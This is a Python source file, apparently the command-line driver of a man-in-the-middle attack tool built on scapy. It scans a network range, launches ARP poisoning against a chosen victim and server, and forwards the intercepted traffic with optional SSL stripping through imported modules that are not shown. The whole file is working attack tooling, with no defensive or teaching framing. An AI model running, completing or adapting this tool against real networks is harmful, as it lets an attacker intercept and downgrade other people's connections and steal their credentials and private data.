import ARPpoisoning as ArpPoisen;
import sslStripping as sslStripping;
import scapy.all as sc;
import re
import ipaddress

victimIP = ""
serverIP = ""
victimMac = ""
serverMac = ""
attackerIP = sc.get_if_addr("enp0s3")
attackerMac = sc.get_if_hwaddr("enp0s3")


def main():
    while True:
        print(attackerIP, attackerMac)
        ipt = ""
        ip_range = ""
        targets = ""
        goal = ""
        sslStrip = ""
        ownServerIp = ""
        silent = ""
        while (ipt != "scan" and  ipt != "arp" and ipt != "quit" and ipt != "mitm"):
            if (ipt != ""):
                print("Invalid input, please try again")
            ipt = input("Enter a command: Scan, ARP, mitm, quit: ").strip().lower()

        if ipt == "scan":
            while (not is_cidr_range(ip_range)):
                if (ip_range != ""):
                    print("Invalid input, please try again")
                ip_range = input("Enter ip range in CIDR notation: ").strip().lower()
            scan(ip_range)

        elif ipt == "arp" or ipt == "mitm":
            if (ipt == "arp"):
                while (not is_valid_ip_pair(targets)):
                    if (targets != ""):
                        print("Invalid input, please try again")
                    targets = input("Enter 'victim ip, server ip'. Server ip can be 'none' or both can be 'none: ").strip().lower()
                    parts = [p.strip() for p in targets.split(',')]
                    victimIP = parts[0] if parts[0] != "none" else None
                    serverIP = parts[1] if parts[1] != "none" else None

                while (silent != "silent" and silent != "allout"):
                    if (silent != ""):
                        print("Invalid input, please try again")
                    silent = input("Enter 'silent' or 'allOut': ").strip().lower()
            elif (ipt == "mitm"):
                while (not is_valid_full_ip_pair(targets)):
                    if (targets != ""):
                        print("Invalid input, please try again")
                    targets = input("Enter 'victim ip, server ip': ").strip().lower()
                    parts = [p.strip() for p in targets.split(',')]
                    victimIP = parts[0] if parts[0] != "none" else None
                    serverIP = parts[1] if parts[1] != "none" else None
                serverMac = get_mac(serverIP)
                victimMac = get_mac(victimIP)
                    

            while (sslStrip != "yes" and sslStrip != "no" and sslStrip != "y" and sslStrip != "n"):
                if (sslStrip != ""):
                    print("Invalid input, please try again")                    
                sslStrip = input("Use ssl stripping when possible: (y/n) ").strip().lower()

            if ipt == "arp":
                serverMac, victimMac, serverIP, victimIP = ArpPoisen.arp_poisoning(victimIP, serverIP, silent)
                
            if (sslStrip == "yes" or sslStrip == "y"):
                sslStripping.forwarding(True, "enp0s3", victimIP, attackerIP, victimMac, serverIP, attackerMac, serverMac)
            else:
                sslStripping.forwarding(False, "enp0s3", victimIP, attackerIP, victimMac, serverIP, attackerMac, serverMac)

        elif ipt == "quit":
            break
        else:
            print("Unknown command. Try again.")


def get_mac(ip):
    # Create ARP request packet
    arp_request = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    # Send the packet and receive the response
    answered_list = sc.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    # Parse response
    for sent, received in answered_list:
        return received.hwsrc  # MAC address

    return None

def scan(ip_range):
    hosts = ArpPoisen.network_scan(ip_range)
    for host in hosts:
        print(host)
    return

def stop_at_syn(pkt):
    if pkt.haslayer(sc.TCP):
        tcp = pkt[sc.TCP]
        # Check if SYN flag is set (flags is an int, SYN flag = 0x02)
        # Or just do tcp.flags & 0x02 != 0
        if tcp.flags & 0x02:
            return True
    return False


def is_valid_ip_pair(s):
    parts = [part.strip() for part in s.split(",")]
    if len(parts) != 2:
        return False
    ip_octet = r"(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)"
    ip_pattern = rf"{ip_octet}\.{ip_octet}\.{ip_octet}\.{ip_octet}"

    full_ip = rf"^{ip_pattern},\s*{ip_pattern}$"
    ip_none = rf"^{ip_pattern},\s*none$"
    none_none = r"^none,\s*none$"

    return bool(
        re.match(full_ip, s, re.IGNORECASE) or
        re.match(ip_none, s, re.IGNORECASE) or
        re.match(none_none, s, re.IGNORECASE)
    )


def is_valid_full_ip_pair(s):
    try:
        # Split on comma and strip whitespace
        parts = [part.strip() for part in s.split(",")]
        if len(parts) != 2:
            return False
        # Check if both parts are valid IP addresses
        ipaddress.ip_address(parts[0])
        ipaddress.ip_address(parts[1])
        return True
    except ValueError:
        return False

def is_cidr_range(s):
    try:
        # Check if it's a valid IPv4 network
        ipaddress.IPv4Network(s, strict=False)
        return True
    except ValueError:
        return False
    
def is_ipv4_address(s):
    try:
        ipaddress.IPv4Address(s)
        return True
    except ValueError:
        return False
    
def forwardToExternalServer(client_ip, server_ip, attacker_ip):
    ArpPoisen.own_server(client_ip, server_ip, attacker_ip)


